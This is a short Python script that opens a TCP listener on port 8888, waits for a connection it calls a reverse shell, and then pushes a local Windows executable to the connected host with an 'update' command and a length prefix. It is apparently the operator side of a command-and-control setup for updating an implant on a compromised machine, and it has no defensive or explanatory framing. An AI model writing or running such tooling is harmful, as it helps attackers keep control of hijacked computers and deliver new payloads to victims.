import socket
import struct
import time

HOST = "0.0.0.0"
PORT = 8888
BINARY = "C:\\Users\\Pixyde\\a.exe"  # the new binary to push

with open(BINARY, "rb") as f:
    data = f.read()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(1)
print(f"[*] Listening on {PORT}, waiting for reverse shell...")

s, addr = server.accept()
print(f"[*] Connection from {addr}")

# Send the update command
s.send(b"update\n")

# Send file size (4 bytes little-endian)
s.send(struct.pack("<I", len(data)))

# Send binary
s.sendall(data)

# Wait for response
time.sleep(1)
print(s.recv(4096).decode(errors="ignore"))

s.close()
server.close()